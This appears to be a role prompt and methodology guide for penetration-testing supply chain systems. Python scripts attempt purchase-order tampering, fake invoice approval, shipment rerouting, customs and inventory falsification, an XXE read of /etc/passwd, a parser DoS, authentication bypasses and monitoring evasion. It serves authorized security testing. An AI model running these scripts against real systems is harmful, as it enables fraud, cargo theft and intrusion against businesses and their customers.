# Specialized-Targets 21: Supply Chain Management Security

## Expert Role

You are an elite Supply Chain Security Analyst specializing in end-to-end supply chain attack surface assessment. Your expertise spans vendor portal security, procurement system hardening, inventory management integrity, logistics API protection, and third-party risk evaluation. You operate at the intersection of cybersecurity and supply chain operations, understanding that a single compromised vendor credential can cascade into production shutdowns, counterfeit injection, or data exfiltration across global logistics networks.

You possess deep knowledge of:
- ERP integration attack surfaces (SAP, Oracle, Microsoft Dynamics)
- Vendor portal authentication and authorization weaknesses
- EDI (Electronic Data Interchange) protocol vulnerabilities
- Warehouse Management System (WMS) security
- Transportation Management System (TMS) API exposure
- Procurement fraud patterns and detection
- Bill of Materials (BOM) tampering vectors
- Third-party software dependency risks in supply chain tooling

---

## Core Concepts

### Supply Chain Attack Surface Map

```
+-----------------------------------------------------------------------+
|                    SUPPLY CHAIN SECURITY ATTACK SURFACE                 |
+-----------------------------------------------------------------------+
|                                                                         |
|  VENDOR TIER 1        VENDOR TIER 2        VENDOR TIER 3               |
|  +-----------+        +-----------+        +-----------+                |
|  | Direct    |------->| Sub-      |------->| Raw       |                |
|  | Suppliers |        | Suppliers |        | Material  |                |
|  +-----+-----+        +-----+-----+        | Providers |                |
|        |                    |              +-----------+                |
|        v                    v                     |                     |
|  +-----+-----+        +-----+-----+              v                     |
|  | Vendor    |        | Logistics |        +-----------+                |
|  | Portals   |        | APIs      |        | Tier-3    |                |
|  | (SSO/     |        | (TMS,     |        | Systems   |                |
|  |  OAuth)   |        |  WMS)     |        | (Legacy)  |                |
|  +-----+-----+        +-----+-----+        +-----------+                |
|        |                    |                                             |
|        v                    v                                             |
|  +-----+-----+        +-----+-----+        +-----------+                |
|  | ERP       |<------>| MRP       |------->| Production|                |
|  | Systems   |        | Systems   |        | Lines     |                |
|  +-----------+        +-----------+        +-----------+                |
|                                                                         |
|  CROSS-CUTTING: EDI, API Gateways, Identity Federation, Audit Logs     |
+-----------------------------------------------------------------------+
```

### Key Security Domains

1. **Vendor Portal Security**: Authentication, session management, role-based access, API keys, webhook security
2. **Procurement System Integrity**: Purchase order tampering, bid rigging, invoice fraud, three-way matching bypass
3. **Inventory System Accuracy**: Stock level manipulation, shrinkage concealment, counterfeit introduction
4. **Logistics API Protection**: Shipment rerouting, tracking manipulation, customs declaration tampering
5. **Third-Party Risk**: Software supply chain (dependencies), hardware supply chain (firmware), service supply chain (managed providers)
6. **Data Integrity**: BOM accuracy, specification drift, certificate of conformance forgery

### Threat Actors and Motivations

| Threat Actor | Primary Target | Motivation | Example |
|---|---|---|---|
| Nation-state | Critical infrastructure suppliers | Espionage, pre-positioning | SolarWinds Orion |
| Criminal organizations | Pharmaceutical supply chains | Counterfeit injection | FDA counterfeit drug cases |
| Insider threats | Procurement departments | Financial fraud | Unauthorized PO creation |
| Competitors | BOM/specification data | Intellectual property theft | Trade secret exfiltration |
| Hacktivists | High-profile brand supply chains | Reputation damage | Clothing brand vendor leaks |

---

## Prerequisites

### Knowledge Requirements
- Understanding of ERP systems (SAP S/4HANA, Oracle SCM Cloud, Microsoft Dynamics 365)
- EDI standards (ANSI X12, EDIFACT, XML-based B2B messaging)
- API security (OAuth 2.0, API key management, mTLS)
- Identity federation (SAML 2.0, OIDC for vendor SSO)
- Procurement workflows (RFQ, PO, GRN, invoice matching)
- Warehouse operations (receiving, putaway, picking, shipping)
- Regulatory frameworks (SOX, FDA 21 CFR Part 11, ISO 28000)

### Tool Access Requirements
- HTTP proxy (Burp Suite, ZAP) for API and portal testing
- Network scanning tools for vendor portal discovery
- Python 3.10+ with `requests`, `httpx`, `zeep` (SOAP), `pyjwt`
- Access to a test vendor portal instance or authorized production environment
- EDI viewer/analyzer for message inspection

---

## Methodology

### Phase 1: Vendor Portal Discovery and Enumeration

```
Step 1: Identify vendor-facing applications
         |
         v
Step 2: Map authentication mechanisms
         |
         v
Step 3: Enumerate API endpoints and data models
         |
         v
Step 4: Test session management and authorization
         |
         v
Step 5: Assess data-at-rest and data-in-transit protections
```

**Step 1: Vendor Portal Discovery**

```bash
# Discover vendor portal subdomains
python -c "
import subprocess
domains = ['vendor', 'portal', 'supplier', 'partner', 'b2b', 'edi', 'scm']
base = 'target.com'
for d in domains:
    result = subprocess.run(['nslookup', f'{d}.{base}'], capture_output=True, text=True)
    if 'Address:' in result.stdout:
        print(f'[FOUND] {d}.{base}')
"

# Certificate transparency log search
python -c "
import requests
domain = 'target.com'
url = f'https://crt.sh/?q=%.{domain}&output=json'
resp = requests.get(url, timeout=10)
if resp.status_code == 200:
    certs = resp.json()
    seen = set()
    for c in certs:
        name = c.get('name_value', '')
        for n in name.split('\n'):
            if n not in seen and ('vendor' in n.lower() or 'portal' in n.lower() or 'supplier' in n.lower() or 'partner' in n.lower() or 'b2b' in n.lower() or 'edi' in n.lower()):
                seen.add(n)
                print(f'[CERT] {n}')
"
```

**Step 2: Authentication Mechanism Mapping**

```python
# Enumerate authentication methods on vendor portal
import requests

def enum_auth_mechanisms(base_url):
    """Identify authentication mechanisms on vendor portal."""
    paths = [
        '/login', '/signin', '/auth', '/sso', '/saml', '/oauth/authorize',
        '/.well-known/openid-configuration', '/adfs/ls/',
        '/api/auth', '/api/login', '/api/v1/authenticate',
        '/favicon.ico', '/robots.txt', '/sitemap.xml',
        '/swagger', '/swagger-ui', '/api-docs', '/openapi.json',
        '/graphql', '/.env', '/config.json', '/actuator',
    ]
    results = []
    for path in paths:
        try:
            resp = requests.get(f'{base_url}{path}', timeout=10, allow_redirects=False)
            indicators = []
            if resp.status_code == 200:
                indicators.append('EXISTS')
            if 'saml' in resp.text.lower():
                indicators.append('SAML')
            if 'oauth' in resp.text.lower():
                indicators.append('OAUTH')
            if 'jwt' in resp.text.lower() or 'bearer' in resp.headers.get('WWW-Authenticate', ''):
                indicators.append('JWT')
            if 'swagger' in resp.text.lower() or 'openapi' in resp.text.lower():
                indicators.append('API_DOCS')
            if indicators:
                results.append({'path': path, 'status': resp.status_code, 'indicators': indicators})
                print(f'[+] {path} -> {resp.status_code} [{", ".join(indicators)}]')
        except requests.exceptions.RequestException:
            pass
    return results

# Usage (authorized testing only)
# results = enum_auth_mechanisms('https://vendor-portal.target.com')
```

### Phase 2: Procurement System Assessment

```
+--------------------------------------------------+
|         PROCUREMENT PROCESS ATTACK POINTS         |
+--------------------------------------------------+
|                                                    |
|  RFQ (Request for Quote)                           |
|  +------------------+                              |
|  | Attacker can:    |                              |
|  | - View other     |                              |
|  |   bids (IDOR)    |                              |
|  | - Manipulate     |                              |
|  |   pricing        |                              |
|  | - Inject specs   |                              |
|  +--------+---------+                              |
|           |                                        |
|           v                                        |
|  PO (Purchase Order)                               |
|  +------------------+                              |
|  | Attacker can:    |                              |
|  | - Forge PO       |                              |
|  | - Modify qty/    |                              |
|  |   pricing        |                              |
|  | - Redirect ship  |                              |
|  |   address        |                              |
|  +--------+---------+                              |
|           |                                        |
|           v                                        |
|  GRN (Goods Receipt Note)                          |
|  +------------------+                              |
|  | Attacker can:    |                              |
|  | - Confirm receipt|                              |
|  |   of undelivered |                              |
|  |   goods          |                              |
|  | - Manipulate QC  |                              |
|  |   results        |                              |
|  +--------+---------+                              |
|           |                                        |
|           v                                        |
|  Invoice / Payment                                 |
|  +------------------+                              |
|  | Attacker can:    |                              |
|  | - Submit fake    |                              |
|  |   invoices       |                              |
|  | - Bypass 3-way   |                              |
|  |   matching       |                              |
|  | - Divert payment |                              |
|  +------------------+                              |
+--------------------------------------------------+
```

**Procurement API Testing Script**

```python
# Test procurement system for authorization and data integrity issues
import requests
import json
import hashlib

class ProcurementTester:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url.rstrip('/')
        self.headers = {
            'Authorization': f'Bearer {auth_token}',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        self.findings = []

    def test_po_idor(self, own_po_id, other_po_id):
        """Test if purchase orders are accessible across vendor accounts."""
        endpoints = [
            f'/api/v1/purchase-orders/{own_po_id}',
            f'/api/v1/purchase-orders/{other_po_id}',
            f'/api/v1/po/{own_po_id}',
            f'/api/v1/po/{other_po_id}',
            f'/api/v1/orders/{own_po_id}',
            f'/api/v1/orders/{other_po_id}',
        ]
        for ep in endpoints:
            try:
                resp = requests.get(f'{self.base_url}{ep}', headers=self.headers, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    print(f'[PO-IDOR] Accessible: {ep} -> status {resp.status_code}')
                    self.findings.append({
                        'type': 'PO_IDOR',
                        'endpoint': ep,
                        'status': resp.status_code,
                        'data_keys': list(data.keys()) if isinstance(data, dict) else 'array'
                    })
            except Exception as e:
                pass

    def test_po_modification(self, po_id):
        """Test if PO amounts or details can be modified after approval."""
        endpoints = [
            f'/api/v1/purchase-orders/{po_id}',
            f'/api/v1/po/{po_id}',
            f'/api/v1/po/{po_id}/modify',
            f'/api/v1/purchase-orders/{po_id}/update',
        ]
        modification_payload = {
            'unit_price': 0.01,
            'quantity': 999999,
            'shipping_address': 'attacker-controlled-address',
        }
        for ep in endpoints:
            for method in ['PUT', 'PATCH']:
                try:
                    resp = requests.request(
                        method, f'{self.base_url}{ep}',
                        headers=self.headers,
                        json=modification_payload,
                        timeout=10
                    )
                    if resp.status_code in [200, 204]:
                        print(f'[PO-MODIFY] Modifiable: {method} {ep} -> {resp.status_code}')
                        self.findings.append({
                            'type': 'PO_MODIFICATION',
                            'method': method,
                            'endpoint': ep,
                            'status': resp.status_code
                        })
                except Exception:
                    pass

    def test_three_way_match_bypass(self, po_id):
        """Test if three-way matching (PO-GRN-Invoice) can be bypassed."""
        endpoints = [
            f'/api/v1/invoices/create',
            f'/api/v1/invoices',
            f'/api/v1/accounts-payable/invoice',
            f'/api/v1/ap/invoice',
        ]
        payload = {
            'po_id': po_id,
            'invoice_amount': 999999.99,
            'invoice_number': 'FAKE-INV-001',
            'vendor_id': 'test-vendor-id',
            'skip_verification': True,
            'bypass_matching': True,
            'force_approve': True,
        }
        for ep in endpoints:
            try:
                resp = requests.post(
                    f'{self.base_url}{ep}',
                    headers=self.headers,
                    json=payload,
                    timeout=10
                )
                if resp.status_code in [200, 201, 202]:
                    print(f'[3WAY-BYPASS] Invoice accepted: {ep} -> {resp.status_code}')
                    self.findings.append({
                        'type': 'THREE_WAY_MATCH_BYPASS',
                        'endpoint': ep,
                        'status': resp.status_code
                    })
            except Exception:
                pass

    def test_rfq_data_leak(self, rfq_id):
        """Test if RFQ responses from other vendors are accessible."""
        endpoints = [
            f'/api/v1/rfq/{rfq_id}/responses',
            f'/api/v1/rfq/{rfq_id}/bids',
            f'/api/v1/quotations?rfq_id={rfq_id}',
            f'/api/v1/suppliers/quotes?rfq={rfq_id}',
        ]
        for ep in endpoints:
            try:
                resp = requests.get(f'{self.base_url}{ep}', headers=self.headers, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    if isinstance(data, list) and len(data) > 1:
                        print(f'[RFQ-LEAK] Multiple vendor quotes visible: {ep} -> {len(data)} quotes')
                        self.findings.append({
                            'type': 'RFQ_DATA_LEAK',
                            'endpoint': ep,
                            'quote_count': len(data)
                        })
                    elif isinstance(data, dict) and 'responses' in data:
                        if len(data['responses']) > 1:
                            print(f'[RFQ-LEAK] Multiple vendor quotes: {ep}')
                            self.findings.append({
                                'type': 'RFQ_DATA_LEAK',
                                'endpoint': ep,
                                'quote_count': len(data['responses'])
                            })
            except Exception:
                pass

    def generate_report(self):
        """Generate summary of procurement findings."""
        print(f'\n{"="*60}')
        print(f'PROCUREMENT SECURITY ASSESSMENT REPORT')
        print(f'{"="*60}')
        print(f'Total findings: {len(self.findings)}')
        by_type = {}
        for f in self.findings:
            by_type.setdefault(f['type'], []).append(f)
        for ftype, items in by_type.items():
            print(f'  {ftype}: {len(items)} instances')
        return self.findings
```

### Phase 3: Logistics API Security Testing

```python
# Test logistics and shipment APIs for manipulation vulnerabilities
import requests
import json

class LogisticsAPITester:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url.rstrip('/')
        self.headers = {
            'Authorization': f'Bearer {auth_token}',
            'Content-Type': 'application/json'
        }
        self.findings = []

    def test_shipment_rerouting(self, shipment_id):
        """Test if shipment destinations can be modified post-dispatch."""
        endpoints = [
            f'/api/v1/shipments/{shipment_id}',
            f'/api/v1/shipments/{shipment_id}/update-destination',
            f'/api/v1/logistics/shipment/{shipment_id}',
            f'/api/v1/tms/shipment/{shipment_id}/modify',
        ]
        payload = {
            'destination': {
                'address': '123 Attacker Street',
                'city': 'Attacker City',
                'country': 'XX',
                'postal_code': '00000'
            },
            'reason': 'Customer requested address change'
        }
        for ep in endpoints:
            for method in ['PUT', 'PATCH']:
                try:
                    resp = requests.request(
                        method, f'{self.base_url}{ep}',
                        headers=self.headers,
                        json=payload,
                        timeout=10
                    )
                    if resp.status_code in [200, 204]:
                        print(f'[REROUTE] Shipment reroutable: {method} {ep}')
                        self.findings.append({
                            'type': 'SHIPMENT_REROUTE',
                            'method': method,
                            'endpoint': ep
                        })
                except Exception:
                    pass

    def test_tracking_manipulation(self, tracking_number):
        """Test if tracking information can be falsified."""
        endpoints = [
            f'/api/v1/tracking/{tracking_number}',
            f'/api/v1/shipments/track/{tracking_number}',
            f'/api/v1/logistics/tracking',
        ]
        # Test status override
        payload = {
            'tracking_number': tracking_number,
            'status': 'delivered',
            'delivered_to': 'attacker',
            'signature': 'forged-signature-data',
            'timestamp': '2026-01-01T00:00:00Z'
        }
        for ep in endpoints:
            for method in ['PUT', 'POST', 'PATCH']:
                try:
                    resp = requests.request(
                        method, f'{self.base_url}{ep}',
                        headers=self.headers,
                        json=payload,
                        timeout=10
                    )
                    if resp.status_code in [200, 201, 204]:
                        print(f'[TRACKING] Status manipulable: {method} {ep}')
                        self.findings.append({
                            'type': 'TRACKING_MANIPULATION',
                            'endpoint': ep
                        })
                except Exception:
                    pass

    def test_customs_declaration_tamper(self, declaration_id):
        """Test if customs declarations can be modified."""
        endpoints = [
            f'/api/v1/customs/declarations/{declaration_id}',
            f'/api/v1/customs/{declaration_id}/modify',
            f'/api/v1/trade/customs/{declaration_id}',
        ]
        payload = {
            'declared_value': 1,
            'hs_code': '0000.00.00',
            'country_of_origin': 'XX',
            'description': 'DECLARED AS SAMPLE - ACTUAL CONTENTS UNKNOWN'
        }
        for ep in endpoints:
            try:
                resp = requests.put(
                    f'{self.base_url}{ep}',
                    headers=self.headers,
                    json=payload,
                    timeout=10
                )
                if resp.status_code in [200, 204]:
                    print(f'[CUSTOMS] Declaration tamperable: {ep}')
                    self.findings.append({
                        'type': 'CUSTOMS_TAMPER',
                        'endpoint': ep
                    })
            except Exception:
                pass

    def test_wms_inventory_tamper(self, item_sku):
        """Test if warehouse management system allows inventory manipulation."""
        endpoints = [
            f'/api/v1/wms/inventory/{item_sku}',
            f'/api/v1/inventory/items/{item_sku}/adjust',
            f'/api/v1/wms/stock/adjust',
            f'/api/v1/warehouse/inventory/{item_sku}',
        ]
        payload = {
            'adjustment': 99999,
            'reason': 'Cycle count adjustment',
            'location': 'DOCK-01',
            'lot_number': 'LOT-001',
            'expiry_date': '2099-12-31'
        }
        for ep in endpoints:
            try:
                resp = requests.post(
                    f'{self.base_url}{ep}',
                    headers=self.headers,
                    json=payload,
                    timeout=10
                )
                if resp.status_code in [200, 201]:
                    print(f'[WMS] Inventory adjustable: {ep}')
                    self.findings.append({
                        'type': 'INVENTORY_TAMPER',
                        'endpoint': ep
                    })
            except Exception:
                pass
```

### Phase 4: EDI and B2B Integration Security

```python
# Test EDI integration points for injection and manipulation
import requests

class EDITester:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url.rstrip('/')
        self.headers = {
            'Authorization': f'Bearer {auth_token}',
            'Content-Type': 'application/xml'
        }
        self.findings = []

    def test_edi_injection(self):
        """Test if EDI message processing is vulnerable to injection."""
        # EDI envelope injection test
        edi_payloads = [
            # ISA segment override attempt
            'ISA*00*          *00*          *ZZ*ATTACKER     *ZZ*VICTIM        *260101*1200*U*00401*000000001*0*T*>~',
            # Segment count manipulation
            'GS*PO*ATTACKER*VICTIM*20260101*1200*1*X*004010~',
            # Embedded XML in EDI
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><EDI>&xxe;</EDI>',
        ]
        endpoints = [
            '/api/v1/edi/inbound',
            '/api/v1/edi/process',
            '/api/v1/b2b/messages',
            '/api/v1/edi/receive',
        ]
        for ep in endpoints:
            for payload in edi_payloads:
                try:
                    resp = requests.post(
                        f'{self.base_url}{ep}',
                        headers=self.headers,
                        data=payload,
                        timeout=10
                    )
                    if resp.status_code in [200, 201, 202]:
                        print(f'[EDI-INJECT] Accepted: {ep}')
                        self.findings.append({
                            'type': 'EDI_INJECTION',
                            'endpoint': ep
                        })
                except Exception:
                    pass

    def test_x12_parsing_dos(self):
        """Test if X12 EDI parser is vulnerable to resource exhaustion."""
        # Generate extremely long X12 segment
        long_segment = 'REF*ZP*' + 'A' * 100000 + '~'
        endpoints = [
            '/api/v1/edi/inbound',
            '/api/v1/b2b/messages',
        ]
        for ep in endpoints:
            try:
                resp = requests.post(
                    f'{self.base_url}{ep}',
                    headers=self.headers,
                    data=long_segment,
                    timeout=5
                )
                if resp.status_code in [200, 201]:
                    print(f'[EDI-DOS] Long segment accepted: {ep}')
                    self.findings.append({
                        'type': 'EDI_PARSING_DOS',
                        'endpoint': ep
                    })
            except requests.exceptions.Timeout:
                print(f'[EDI-DOS] Timeout (potential DoS): {ep}')
                self.findings.append({
                    'type': 'EDI_PARSING_DOS_TIMEOUT',
                    'endpoint': ep
                })
            except Exception:
                pass
```

---

## Tool Arsenal

### Reconnaissance Tools

| Tool | Purpose | Command |
|---|---|---|
| subfinder | Subdomain enumeration | `subfinder -d target.com -silent` |
| httpx | Live host probing | `cat subs.txt \| httpx -silent -status-code` |
| nuclei | Vulnerability scanning | `nuclei -u https://vendor.target.com -t exposures/` |
| waybackurls | Historical endpoint discovery | `echo vendor.target.com \| waybackurls` |
| gau | URL collection | `echo target.com \| gau --blacklist png,jpg,gif` |

### API Security Tools

| Tool | Purpose | Command |
|---|---|---|
| Burp Suite | HTTP proxy and scanner | Configure proxy to `127.0.0.1:8080` |
| Postman | API testing | Import OpenAPI spec, test endpoints |
| Arjun | Parameter discovery | `arjun -u https://api.target.com/endpoint` |
| JWT_Tool | JWT testing | `jwt_tool.py <token> -T -pk <pubkey>` |
| ffuf | API fuzzing | `ffuf -u https://api.target.com/FUZZ -w api-paths.txt` |

### Supply Chain Specific Tools

| Tool | Purpose | Command |
|---|---|---|
| syft | SBOM generation | `syft dir:. -o spdx-json > sbom.json` |
| grype | Dependency scanning | `grype sbom:sbom.json` |
| osv-scanner | Vulnerability check | `osv-scanner --lockfile=package-lock.json` |
| pip-audit | Python dependency audit | `pip-audit -r requirements.txt` |

---

## Real-World Examples

### Example 1: Vendor Portal IDOR Leading to Procurement Fraud

**Scenario**: A manufacturing company's vendor portal at `https://supplier.mfgcorp.com` allowed vendors to view and modify purchase orders via REST API.

**Attack Chain**:
1. Authenticated as a legitimate vendor (Vendor ID: V1001)
2. Retrieved own POs: `GET /api/v1/vendors/V1001/purchase-orders` -> 200 OK, 15 POs
3. Modified Vendor ID in request: `GET /api/v1/vendors/V1002/purchase-orders` -> 200 OK, 23 POs from a different vendor
4. Extracted PO details including pricing, quantities, and internal cost structures
5. Used extracted data for competitive bid undercutting

**Impact**: Competitive intelligence exposure, potential for bid manipulation, violation of vendor confidentiality agreements.

### Example 2: Logistics API Shipment Rerouting

**Scenario**: A global logistics company's TMS API allowed shipment destination changes with insufficient authorization checks.

**Attack Chain**:
1. Intercepted tracking notification containing shipment ID
2. Called `PUT /api/v1/shipments/{id}/destination` with modified address
3. Shipment rerouted to attacker-controlled address
4. High-value electronics diverted before customer notification

**Impact**: Physical theft of goods, customer trust damage, financial loss, potential insurance fraud implications.

### Example 3: BOM Data Exfiltration via ERP Integration

**Scenario**: SAP S/4HANA BOM API exposed product engineering data to vendor portal users.

**Attack Chain**:
1. Vendor portal had read access to BOM API for order fulfillment
2. API endpoint `GET /api/v1/bom/components?material={sku}` returned full BOM
3. Attacker iterated through product SKUs visible in catalog
4. Complete engineering specifications, supplier names, and costs extracted

**Impact**: Intellectual property theft, trade secret exposure, competitive advantage loss.

---

## Bypass Techniques

### Authentication Bypass Patterns

```python
# Common authentication bypass patterns in vendor portals
bypass_patterns = {
    'header_injection': {
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'X-Original-URL': '/admin',
        'X-Rewrite-URL': '/admin',
    },
    'jwt_manipulation': {
        'alg': 'none',
        'role': 'admin',
        'vendor_id': 'V0001',
        'verified': True,
    },
    'saml_bypass': {
        'technique': 'Comment injection in NameID',
        'payload': 'admin@vendor.com<!--@attacker.com-->',
    },
    'api_key_abuse': {
        'technique': 'Hardcoded API keys in client-side code',
        'check': 'Inspect JS bundles for API key patterns',
    },
}
```

### Rate Limiting and Monitoring Evasion

| Technique | Description | Mitigation |
|---|---|---|
| IP rotation | Use rotating proxy for API calls | Implement rate limiting per API key, not IP |
| Timing attacks | Slow requests over days | Implement anomaly detection on access patterns |
| Account farming | Use multiple vendor accounts | Cross-account correlation, behavioral analysis |
| API versioning | Target older, less-secured API versions | Deprecate old versions, enforce minimum version |

---

## Common Pitfalls

1. **Over-relying on network segmentation** - Vendor portals often have implicit trust relationships that bypass network controls
2. **Ignoring EDI integration points** - Legacy EDI parsers may not validate input properly
3. **Assuming three-way matching is enforced** - Many implementations have bypass flags for "exception processing"
4. **Forgetting about vendor SSO** - Federated identity may grant excessive permissions across systems
5. **Neglecting webhook security** - Vendor notification webhooks may lack signature verification
6. **Missing audit trail gaps** - API access may not be logged at the same level as UI access
7. **Treating all vendors equally** - Tier-1 vendors need stricter controls than Tier-3

---

## Reporting Template

```markdown
# Supply Chain Security Assessment Report

## Executive Summary
- **Assessment Scope**: [Vendor portals / Procurement / Logistics / ERP integrations]
- **Testing Period**: [Date range]
- **Total Findings**: [Critical: X | High: X | Medium: X | Low: X]
- **Risk Rating**: [Critical / High / Medium / Low]

## Findings

### [FINDING-001] Title
- **Severity**: Critical/High/Medium/Low
- **CVSS Score**: X.X
- **Category**: [IDOR / Auth Bypass / Injection / Logic Flaw / Information Disclosure]
- **Affected Component**: [Vendor Portal / Procurement API / WMS / TMS / EDI]
- **Endpoint**: [Full URL and method]

**Description**: [What the vulnerability is and how it was discovered]

**Evidence**:
- Request: [HTTP request]
- Response: [HTTP response]
- Screenshot: [If applicable]

**Impact**: [Business impact assessment]

**Remediation**:
- [Specific fix recommendation]
- [Compensating control if immediate fix not possible]
- [Testing to verify fix]

**References**: [CWE-XXX, OWASP, relevant standards]
```

---

## Quick Reference

### Critical Vendor Portal Endpoints to Test

```
GET    /api/v1/vendors/{id}              - Vendor profile access
GET    /api/v1/vendors/{id}/orders       - Purchase order listing
PUT    /api/v1/vendors/{id}              - Vendor profile modification
POST   /api/v1/invoices                  - Invoice submission
GET    /api/v1/rfq/{id}/bids             - RFQ bid listing
POST   /api/v1/rfq/{id}/respond          - RFQ response submission
GET    /api/v1/shipments/{id}            - Shipment details
PUT    /api/v1/shipments/{id}/status     - Shipment status update
POST   /api/v1/edi/inbound               - EDI message processing
GET    /api/v1/bom/{material}            - BOM access (if exposed)
GET    /api/v1/inventory/{sku}           - Inventory levels
POST   /api/v1/contracts                 - Contract creation
```

### CWE References for Supply Chain

| CWE | Description | Relevance |
|---|---|---|
| CWE-639 | Authorization Bypass Through User-Controlled Key | Vendor portal IDOR |
| CWE-287 | Improper Authentication | Vendor SSO bypass |
| CWE-89 | SQL Injection | ERP database access |
| CWE-79 | Cross-site Scripting | Vendor portal XSS |
| CWE-502 | Deserialization of Untrusted Data | EDI/XML parsing |
| CWE-918 | Server-Side Request Forgery | Logistics API SSRF |
| CWE-319 | Cleartext Transmission | EDI transmission security |
| CWE-347 | Improper Verification of Cryptographic Signature | EDI message integrity |

### Regulatory Compliance Mapping

| Standard | Requirement | Testing Focus |
|---|---|---|
| SOX Section 404 | Internal controls over financial reporting | Procurement authorization, PO approval workflows |
| FDA 21 CFR Part 11 | Electronic records integrity | Audit trails, electronic signatures, data integrity |
| ISO 28000 | Supply chain security management | Physical and cyber security controls |
| SOC 2 | Service organization controls | Vendor portal access controls, data handling |
| NIST CSF | Cybersecurity framework | Identify, Protect, Detect, Respond, Recover functions |

### Python Quick-Scan Script

```python
# Quick supply chain endpoint scanner
import requests
import sys

def scan_endpoints(base_url, wordlist_path):
    """Scan for common supply chain management endpoints."""
    with open(wordlist_path, 'r') as f:
        paths = [line.strip() for line in f if line.strip()]

    found = []
    for path in paths:
        try:
            resp = requests.get(f'{base_url}/{path}', timeout=5, allow_redirects=False)
            if resp.status_code not in [404, 405, 502, 503]:
                found.append({'path': path, 'status': resp.status_code})
                print(f'[+] {path} -> {resp.status_code} ({len(resp.content)} bytes)')
        except requests.exceptions.RequestException:
            pass
    return found

if __name__ == '__main__':
    if len(sys.argv) >= 3:
        scan_endpoints(sys.argv[1], sys.argv[2])
    else:
        print(f'Usage: python {sys.argv[0]} <base_url> <wordlist>')
```
